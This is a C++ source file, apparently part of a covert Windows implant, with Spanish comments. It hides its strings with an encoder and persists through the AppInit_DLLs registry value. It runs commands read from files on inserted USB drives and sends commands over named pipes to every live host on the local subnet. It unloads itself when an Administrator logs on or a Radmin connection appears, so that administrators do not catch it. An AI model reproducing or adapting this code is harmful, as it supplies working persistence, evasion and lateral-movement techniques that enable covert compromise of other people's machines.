#include "stdafx.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>
#include <string>
#include <Sensapi.h>
#include "chkappasusr.cpp"
#include "icmp.cpp"
#include "tcpmonitor.cpp"
#include "util.h"

#pragma comment(lib, "Mpr.lib")
#pragma comment(lib, "Sensapi.lib")

using namespace std;

DWORD ACTIVE_UNISTALL_PROC_BY_DEMAND = FALSE;
DWORD ACTIVE_UNISTALL_PROC_BY_DEMAND_REMOTE = FALSE;
DWORD ACTIVE_UNISTALL_PROC_BY_DEMAND_UPGRADE = FALSE;

LPSTR* GetRemovableDrives(LPDWORD dwCount){
	LPSTR lpBuffer = new CHAR[1024];
	LPSTR lpTmp=NULL;
	LPSTR *lpRemovableDrives = new LPSTR[MAX_ARRAY_REMOVABLE_DRIVES];
	DWORD i=0;

	memset(lpBuffer, 0, 1024);
	memset(lpRemovableDrives, 0, sizeof(LPSTR) * MAX_ARRAY_REMOVABLE_DRIVES);
	
	if(!GetLogicalDriveStrings(1024, lpBuffer)){
		*dwCount = 0;
		return NULL;
	}

	lpTmp = lpBuffer;
	while(strlen(lpTmp)){
		if(GetDriveType(lpTmp) == DRIVE_REMOVABLE && !strstr(lpTmp, "A:")){
			if(i < MAX_ARRAY_REMOVABLE_DRIVES){
				lpRemovableDrives[i] = new CHAR[8];
				memset(lpRemovableDrives[i], 0, 8);
				strcpy(lpRemovableDrives[i], lpTmp);
				i++;
			}
		}

		lpTmp += strlen(lpTmp)+1;
	}
	
	delete[] lpBuffer;
	*dwCount = i;
	return lpRemovableDrives;
}

BOOL ExistsUnistallerFile(){
	DWORD dwCount, i;
	LPSTR *lpArrRemDrives;
	BOOL retVal = FALSE;
	HANDLE hFile;
	LPSTR lpFilePath = new CHAR[MAX_PATH];
	DecodeString ds;

	lpArrRemDrives = GetRemovableDrives(&dwCount);
	if(!lpArrRemDrives)
		return FALSE;
	
	if(dwCount){
		for(i=0; i<= dwCount-1; ++i){
			sprintf(lpFilePath, "%s%s", lpArrRemDrives[i], ds.getDecodeString((LPSTR)FILE_NAME_UNISTALL_FILE));
			delete[] lpArrRemDrives[i];

			if((hFile = CreateFile(lpFilePath, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE, 
				NULL, OPEN_EXISTING, NULL, NULL)) != INVALID_HANDLE_VALUE){
				CloseHandle(hFile);
				retVal = TRUE;
				break;
			}
		}
	}

	delete[] lpFilePath;
	delete[] lpArrRemDrives;
	return retVal;
}

BOOL SendRemoteUnistallCommand(in_addr remoteAddr){
	HANDLE hPipe=NULL;
	LPSTR lpOutBuffer=NULL;
	DWORD BytesRead = 0, retVal=TRUE;
	LPSP_PACKET lpPacket=NULL;
	CHAR msg[MAX_PATH] = {0};
	DecodeString ds;
	string remotePipe = ds.getDecodeString((LPSTR)NAME_PIPE);
	
	sprintf(msg, "\\\\%s", inet_ntoa(remoteAddr));
	if(!MakeConnectionToNetworkResource(msg, "", "")){
#ifdef DEBUG_SHOW_ERROR
		strcat(msg, ", error anom logon");
		MessageBox(NULL, msg, NULL, NULL);
		return FALSE;
#endif
	}

	remotePipe.replace(remotePipe.find(".", 0), 1, inet_ntoa(remoteAddr));
	if((hPipe = CreateFile(remotePipe.c_str(), FILE_WRITE_DATA | FILE_READ_DATA, 
		NULL, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE){
		
		#ifdef DEBUG_SHOW_ERROR
		sprintf(msg, "Error create file: %s - %u", remotePipe.c_str(), GetLastError());
		MessageBox(NULL, msg, NULL, NULL);
		#endif

		retVal = FALSE;
		goto Cleanup;
	}
	
	if(!WriteToPipe(hPipe, strlen(CMD_UNISTALL_NO_REMOTE)+1, CMD_UNISTALL_NO_REMOTE, FLAG_DATA_IS_MACRO)){
		#ifdef DEBUG_SHOW_ERROR
		sprintf(msg, "Error create file: %s", remotePipe.c_str());
		MessageBox(NULL, msg, NULL, NULL);
		#endif

		retVal = FALSE;
		goto Cleanup;
	}

	if(!(lpPacket = ReadPacketFromPipe(hPipe))){
		#ifdef DEBUG_SHOW_ERROR
		sprintf(msg, "Error create file: %s", remotePipe.c_str());
		MessageBox(NULL, msg, NULL, NULL);
		#endif

		retVal = FALSE;
		goto Cleanup;
	}
	
	if((lpPacket->dwFlags & FLAG_ERROR)){
		retVal = FALSE;
		goto Cleanup;
	}
	else{
		retVal = TRUE;
		goto Cleanup;
	}

Cleanup:
	if(lpPacket)
		delete[] lpPacket;
	
	CloseHandle(hPipe);

	sprintf(msg, "\\\\%s", inet_ntoa(remoteAddr));
	TerminateConnectionToNetworkResource(msg);
	return retVal;
}


BOOL ScanSubNetAndNotifyUnistall(in_addr localAddr){
	in_addr tmpAddr;
	int i;

	tmpAddr.S_un.S_addr = localAddr.S_un.S_addr;
	
	for(i=1; i<= 254; i++){
		tmpAddr.S_un.S_un_b.s_b4 = (u_char)i;
		if( tmpAddr.S_un.S_addr == localAddr.S_un.S_addr )
			continue;
		
		if(IsActivePC(tmpAddr)==TRUE)
			//MessageBox(0, inet_ntoa(tmpAddr), NULL, NULL);
			SendRemoteUnistallCommand(tmpAddr);
	}

	return TRUE;
}

//Notificacion de desintalacion a las otras maquinas
BOOL RemoteUnistallProc(){
	WSAData wsa;
	LPSTR localHostName = new CHAR[256];
	hostent *hent;
	BOOL retVal=TRUE;
	in_addr localHostAddr;

	if(!localHostName){
		retVal=FALSE;
		goto Cleanup;
	}

	if(WSAStartup(MAKEWORD(2,2),&wsa)!=0){
		retVal = FALSE;
		goto Cleanup;
	}
	
	if(gethostname(localHostName, 256) == SOCKET_ERROR){
		retVal = FALSE;
		goto Cleanup;
	}

	if(!(hent = gethostbyname(localHostName))){
		retVal = FALSE;
		goto Cleanup;
	}
	
	memcpy((void*)&localHostAddr, hent->h_addr_list[0], 4);

	retVal = ScanSubNetAndNotifyUnistall(localHostAddr);

Cleanup:
	if( localHostName )
		delete[] localHostName;

	return retVal;
}

BOOL DeleteAppInitRegValue(){
	HKEY hKey=NULL;
	DWORD dwValueType = REG_SZ, dwcbOutBuffer = 0;
	LPSTR lpBuffer; /*token, lpStrTmp, lpContext*/;
	BOOL dwRetVal=FALSE;
	string strTmp, token;
	size_t posB=NULL, posE=NULL;
	DecodeString ds;

	if(RegOpenKey(HKEY_LOCAL_MACHINE, 
		ds.getDecodeString((LPSTR)encStr_Software_Microsoft_WindowsNT_CurrentVersion_Windows), &hKey) != ERROR_SUCCESS){
		dwRetVal=FALSE;
		goto Cleanup;
	}

	if(RegQueryValueEx(hKey, ds.getDecodeString((LPSTR)encStr_AppInit_DLLs), NULL, &dwValueType, 
		NULL, &dwcbOutBuffer) == ERROR_SUCCESS){

		if(!dwcbOutBuffer){
			dwRetVal=TRUE;
			goto Cleanup;
		}

		lpBuffer = new CHAR[dwcbOutBuffer+2];
		memset(lpBuffer, 0, dwcbOutBuffer+2);
	}
	else{
		dwRetVal=FALSE;
		goto Cleanup;
	}

	if(RegQueryValueEx(hKey, ds.getDecodeString((LPSTR)encStr_AppInit_DLLs), NULL, &dwValueType, 
		(LPBYTE)lpBuffer, &dwcbOutBuffer) != ERROR_SUCCESS){
		dwRetVal=FALSE;
		goto Cleanup;
	}

	//WWW: Realizar remplace de caracter espacio desde los datos del valor
	strTmp = lpBuffer;
	while(TRUE){
		posE = strTmp.find(",", posB+1);
		if(posE == string::npos ) posE = strTmp.length();

		if(posB >= strTmp.length()-1)
			break;

		token = strTmp.substr(posB, posE-posB);

		posB = posE+1;

		if(!token.length()) break;
			
		if(CheckIsSameProcess(GetCurrentProcess(), token.c_str(), hInstance) == TRUE){
			strTmp.replace(strTmp.find(token, 0), token.length()+1, "");

			if(RegSetValueEx(hKey, ds.getDecodeString((LPSTR)encStr_AppInit_DLLs), NULL, dwValueType, 
				(CONST BYTE*) strTmp.c_str(), strTmp.length()+1) != ERROR_SUCCESS){

				dwRetVal=FALSE;
				goto Cleanup;
			}
			dwRetVal=TRUE;
			break;
		}
	}

Cleanup:
	if(hKey)
		RegCloseKey(hKey);

	if(lpBuffer)
		delete[] lpBuffer;

	return dwRetVal;
}

BOOL UnistallProc(BOOL Remote, BOOL IsUpgrade){
	LPSTR lpModuleFileName = new CHAR[MAX_PATH];
	LPSTR lpTmpPath = new CHAR[MAX_PATH];
	LPSTR lpTmpFileName = new CHAR[MAX_PATH];
	LPSTR lpCmdLine = new CHAR[MAX_PATH];
	LPSTR lpOutBuffer = new CHAR[16];
	FILE *fd;
	DWORD dwBytesRead=NULL, valRet=TRUE, dwINAFlags;
	CHAR msg[256] ={0};
	LPSP_PACKET lpPacket = NULL;
	BOOL boolRetIsNA=FALSE;
	DecodeString ds;

	//Eliminacion de claves del registro: App_InitsDLL, 
	if(!IsUpgrade)
		DeleteAppInitRegValue();
	
	//Create Unload Mutex, to local machine
	lpPacket = SendCommandToShellPipe(NULL, ds.getDecodeString((LPSTR)encStr_cum), FLAG_DATA_IS_MACRO);
	if(lpPacket){
		if(lpPacket->dwFlags & FLAG_ERROR){
			valRet = FALSE;
			#ifdef DEBUG_SHOW_ERROR
			sprintf(msg, "%s", lpPacket->lpData);
			MessageBox(0, msg, NULL, NULL);
			#endif
			goto Cleanup;
		}

		FreePackage(lpPacket);
	}

	//Notificacion para desintalacion remota
	boolRetIsNA = IsNetworkAlive(&dwINAFlags);
	if(Remote && boolRetIsNA && (dwINAFlags & NETWORK_ALIVE_LAN) && !IsUpgrade)
		RemoteUnistallProc();

	//Ejecucion de vbscript para eliminacion segura
	memset(lpModuleFileName, 0, MAX_PATH);
	if(!GetModuleFileName((HMODULE)hInstance, lpModuleFileName, MAX_PATH)){
		valRet=FALSE;
		goto Cleanup;
	}

	if(!GetTempPath(MAX_PATH, lpTmpPath)){
		valRet=FALSE;
		goto Cleanup;
	}

	if(!GetTempFileName(lpTmpPath, ds.getDecodeString((LPSTR)encStr_6ft), TRUE, lpTmpFileName)){
		valRet=FALSE;
		goto Cleanup;
	}

	if(strstr(lpTmpFileName, ds.getDecodeString((LPSTR)encStr_tmp))){
		/*MessageBox(NULL, ds.getDecodeString((LPSTR)encStr_tmp), NULL, NULL);
		MessageBox(NULL, ds.getDecodeString((LPSTR)encStr_vbs), NULL, NULL);
		MessageBox(NULL, ds.getDecodeString((LPSTR)encStr_tmp), ds.getDecodeString((LPSTR)encStr_vbs), NULL);*/
		CHAR lpTmpExtTmp[16]={0};
		CHAR lpTmpExtVbs[16]={0}; 
		strcpy(lpTmpExtTmp, ds.getDecodeString((LPSTR)encStr_tmp));
		strcpy(lpTmpExtVbs, ds.getDecodeString((LPSTR)encStr_vbs));
		strcpy(strstr(lpTmpFileName, lpTmpExtTmp), lpTmpExtVbs);
	}
	
	fd = fopen(lpTmpFileName, "w");
	if(!fd){
		valRet=FALSE;
		goto Cleanup;
	}
	
	fputs((LPCSTR)ds.getDecodeString((LPSTR)VBS_SCRIPT_CODE_UNISTALL), fd);
	fclose(fd);

	//Ejecucion del vbscript de desintalacion
	if(!IsUpgrade)
		sprintf(lpCmdLine, ds.getDecodeString((LPSTR)encStr_wscript_exe_s_s), lpTmpFileName, lpModuleFileName);	
	else
		sprintf(lpCmdLine, ds.getDecodeString((LPSTR)encStr_wscript_exe_s_s_s), lpTmpFileName, lpModuleFileName, FILE_ORIG_UPGRADE);	
	ExecuteApp(lpCmdLine, NULL, FALSE, FALSE, NULL, NULL);

	//Espera para dar tiempo a deteccion de CUM por otras instancias
	Sleep(5000);

	//Envio de macro local para descargarse
	lpPacket = SendCommandToShellPipe(NULL, ds.getDecodeString((LPSTR)encStr_unloadme), FLAG_DATA_IS_MACRO);
	if(lpPacket){
		if(lpPacket->dwFlags & FLAG_ERROR){
			valRet = FALSE;
			#ifdef DEBUG_SHOW_ERROR
			sprintf(msg, "%s", lpPacket->lpData);
			MessageBox(0, msg, NULL, NULL);
			#endif
			goto Cleanup;
		}

		FreePackage(lpPacket);
	}

Cleanup:
	if (lpModuleFileName)
		delete[] lpModuleFileName;
	
	if(lpTmpPath)
		delete[] lpTmpPath;
	
	if(lpTmpFileName)
		delete[] lpTmpFileName;
	
	if(lpCmdLine)
		delete[] lpCmdLine;

	return valRet;
}


BOOL ExecuteAppFromHashFile(void){
	HANDLE hFile=NULL;
	LPSTR *lpArrRemDrives;
	DWORD dwCount=0, dwFileSize=0, nbRead;
	CHAR lpFilePath[MAX_PATH+2]={0};
	BOOL boolRetVal=FALSE;
	LPSTR lpBuffer=NULL;
	int i;
	DecodeString ds;
	
#ifdef DEBUG_SHOW_ERROR
	CHAR msg[256]={0};
#endif

	lpArrRemDrives = GetRemovableDrives(&dwCount);
	if(!lpArrRemDrives)
		return FALSE;

	for(i=0; i<=(int)dwCount-1; i++){
		sprintf(lpFilePath, "%s%s", lpArrRemDrives[i], ds.getDecodeString((LPSTR)FILENAME_EXECUTE_APP));
		delete[] lpArrRemDrives[i];

		if((hFile = CreateFile(lpFilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 
			NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE){

			#ifdef DEBUG_SHOW_ERROR
			sprintf(msg, "Error CreateFile: %u", GetLastError());
			MessageBox(0, msg, NULL, NULL);
			#endif

			continue;
		}else{
			dwFileSize = GetFileSize(hFile, NULL);
			if(dwFileSize == INVALID_FILE_SIZE || !dwFileSize){
				boolRetVal = FALSE;
				goto Cleanup;
			}

			lpBuffer = new CHAR[dwFileSize+2];
			if(!lpBuffer){
				boolRetVal = FALSE;
				goto Cleanup;
			}
			memset(lpBuffer, 0, dwFileSize+2);

			if(!ReadFile(hFile, lpBuffer, dwFileSize, &nbRead, NULL)){

				#ifdef DEBUG_SHOW_ERROR
				sprintf(msg, "Error ReadFile: %u", GetLastError());
				MessageBox(0, msg, NULL, NULL);
				#endif

				boolRetVal = FALSE;
				goto Cleanup;
			}

			if(!nbRead){
				boolRetVal = FALSE;
				goto Cleanup;
			}

			boolRetVal = ExecuteApp(lpBuffer, NULL, FALSE, TRUE, NULL, NULL);
			
			if(SetFilePointer(hFile, 0, 0, FILE_BEGIN) == INVALID_SET_FILE_POINTER){
				#ifdef DEBUG_SHOW_ERROR
				sprintf(msg, "Error SetFilePointer: %u", GetLastError());
				MessageBox(0, msg, NULL, NULL);
				#endif
				CloseHandle(hFile);
				hFile=NULL;
				DeleteFile(lpFilePath);
			}

			if(!SetEndOfFile(hFile)){
				#ifdef DEBUG_SHOW_ERROR
				sprintf(msg, "Error SetFilePointer: %u", GetLastError());
				MessageBox(0, msg, NULL, NULL);
				#endif
				CloseHandle(hFile);
				hFile=NULL;
				DeleteFile(lpFilePath);
			}

			goto Cleanup;
		}
	}

Cleanup:
	if(hFile && hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);

	if(lpArrRemDrives)
		delete[] lpArrRemDrives;

	return boolRetVal;
}

DWORD ThreadMonitor(LPVOID lpParam){
	LPSTR lpszShellPath;
	BOOL checkShellAsAdmin=TRUE;
	DWORD dwRAdminListenPort;
	LPSP_PACKET lpPacket = NULL;
	DecodeString ds;
		
	if(!(lpszShellPath = GetShell()))
		checkShellAsAdmin=FALSE;

	dwRAdminListenPort = GetRAdminListenPort();
	
	#ifdef DEBUG_SHOW_ERROR_TO_FILE
	fileLogPrint("Thread monitor initialized");
	#endif

	for(;;){
		if(ACTIVE_UNISTALL_PROC_BY_DEMAND){
			#ifdef DEBUG_SHOW_ERROR_TO_FILE
			fileLogPrint("Actived uninstall by demand");
			if (ACTIVE_UNISTALL_PROC_BY_DEMAND_UPGRADE)
				fileLogPrint("Upgrading");
			#endif

			UnistallProc(ACTIVE_UNISTALL_PROC_BY_DEMAND_REMOTE, ACTIVE_UNISTALL_PROC_BY_DEMAND_UPGRADE);
			ExitThread(0);
		}

		if(ExistsUnistallerFile()){
			#ifdef DEBUG_SHOW_ERROR_TO_FILE
			fileLogPrint("Actived uninstall by uninstaller file");
			#endif

			UnistallProc(TRUE, FALSE);
			ExitThread(0);
		}

		ExecuteAppFromHashFile();

		#ifdef CHECK_ADMIN_INTERACTIVE_LOGON
		//lpszShellPath
		if(CheckIsProcessRuningAsUser(lpszShellPath/*"packager.exe"*/, ds.getDecodeString((LPSTR)encStr_Administrador))){
			#ifdef DEBUG_SHOW_ERROR_TO_FILE
			fileLogPrint("Actived uninstall by interactive logon");
			#endif

			UnistallProc(TRUE, FALSE);
			ExitThread(0);
		}
		#endif

		//En caso de conexio con radmin, solo tumbamos la dll de memoria
		if(IsPortConnected(dwRAdminListenPort) == TRUE){
			#ifdef DEBUG_SHOW_ERROR_TO_FILE
			fileLogPrint("Actived unload by connection to radmin port");
			#endif

			if(!create_bridged_unload_mutex()){
				lpPacket = SendCommandToShellPipe(NULL, ds.getDecodeString((LPSTR)encStr_disableb), FLAG_DATA_IS_MACRO);
				if(lpPacket){
					if(lpPacket->dwFlags & FLAG_ERROR){}
					FreePackage(lpPacket);
				}
				Sleep(50);
			}
			
			lpPacket = SendCommandToShellPipe(NULL, ds.getDecodeString((LPSTR)encStr_cum), FLAG_DATA_IS_MACRO);
			if(lpPacket){
				if(lpPacket->dwFlags & FLAG_ERROR){}
				FreePackage(lpPacket);
			}

			Sleep(50);
			lpPacket = SendCommandToShellPipe(NULL, ds.getDecodeString((LPSTR)encStr_unloadme), FLAG_DATA_IS_MACRO);
			if(lpPacket){
				if(lpPacket->dwFlags & FLAG_ERROR){}
				FreePackage(lpPacket);
			}
		}

		Sleep(1500);
	}

	return TRUE;
}

